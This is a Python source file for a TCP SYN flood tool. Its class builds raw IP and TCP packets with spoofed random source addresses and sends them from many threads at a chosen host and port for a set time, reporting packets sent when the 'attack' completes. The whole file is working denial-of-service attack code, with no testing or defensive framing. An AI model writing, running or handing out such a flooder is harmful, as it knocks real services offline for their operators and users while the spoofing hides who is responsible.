import socket
import time
import threading
import random
import struct

class TCPSYNFlood:
    """
    TCP SYN Flood - sends SYN packets without completing handshake
    Note: Requires root/admin privileges for raw sockets
    """
    def __init__(self, target, duration=30, threads=100, port=80, callback=None):
        self.target = target
        self.duration = duration
        self.threads = threads
        self.port = port
        self.callback = callback
        self.stop_event = threading.Event()
        self.stats = {
            "packets_sent": 0,
            "start_time": None,
            "end_time": None
        }
        self.lock = threading.Lock()
        
        # Remove protocol if present
        self.target = target.replace("http://", "").replace("https://", "").split("/")[0]
        
        # Resolve target IP
        try:
            self.target_ip = socket.gethostbyname(self.target)
        except:
            self.target_ip = self.target
    
    def log(self, message):
        if self.callback:
            self.callback(message)
        else:
            print(f"[TCP SYN] {message}")
    
    def checksum(self, msg):
        s = 0
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + (msg[i+1] if i+1 < len(msg) else 0)
            s = s + w
        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s
    
    def create_syn_packet(self, source_ip, source_port):
        # IP Header
        ihl = 5
        version = 4
        tos = 0
        tot_len = 20 + 20
        id = random.randint(10000, 60000)
        frag_off = 0
        ttl = 64
        protocol = socket.IPPROTO_TCP
        check = 0
        saddr = socket.inet_aton(source_ip)
        daddr = socket.inet_aton(self.target_ip)
        
        ihl_version = (version << 4) + ihl
        ip_header = struct.pack('!BBHHHBBH4s4s',
            ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
        
        # TCP Header
        seq = random.randint(0, 4294967295)
        ack_seq = 0
        doff = 5
        
        # SYN flag
        fin = 0
        syn = 1
        rst = 0
        psh = 0
        ack = 0
        urg = 0
        window = socket.htons(5840)
        check = 0
        urg_ptr = 0
        
        offset_res = (doff << 4) + 0
        tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
        
        tcp_header = struct.pack('!HHLLBBHHH',
            source_port, self.port, seq, ack_seq, offset_res, tcp_flags, window, check, urg_ptr)
        
        # Pseudo header for checksum
        source_address = socket.inet_aton(source_ip)
        dest_address = socket.inet_aton(self.target_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        
        psh = struct.pack('!4s4sBBH',
            source_address, dest_address, placeholder, protocol, tcp_length)
        psh = psh + tcp_header
        
        tcp_checksum = self.checksum(psh)
        
        # Recreate TCP header with checksum
        tcp_header = struct.pack('!HHLLBBH',
            source_port, self.port, seq, ack_seq, offset_res, tcp_flags, window)
        tcp_header += struct.pack('H', tcp_checksum)
        tcp_header += struct.pack('!H', urg_ptr)
        
        packet = ip_header + tcp_header
        return packet
    
    def send_syn(self):
        try:
            # Create raw socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            # Random source IP and port
            source_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            source_port = random.randint(1024, 65535)
            
            packet = self.create_syn_packet(source_ip, source_port)
            sock.sendto(packet, (self.target_ip, 0))
            
            with self.lock:
                self.stats["packets_sent"] += 1
            
            sock.close()
            return True
        except Exception as e:
            return False
    
    def worker(self):
        while not self.stop_event.is_set():
            self.send_syn()
            time.sleep(0.001)
    
    def run(self):
        self.stats["start_time"] = time.time()
        self.log(f"Starting TCP SYN Flood on {self.target} ({self.target_ip}):{self.port}")
        self.log(f"Duration: {self.duration}s | Threads: {self.threads}")
        self.log("Note: Requires root/admin privileges for raw sockets")
        
        thread_list = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        # Run for specified duration
        time.sleep(self.duration)
        self.stop()
        
        # Wait for threads to finish
        for t in thread_list:
            t.join(timeout=2)
        
        self.stats["end_time"] = time.time()
        self.log(f"Attack completed. SYN packets sent: {self.stats['packets_sent']}")
        return self.stats
    
    def stop(self):
        self.stop_event.set()
        self.log("Stop signal received")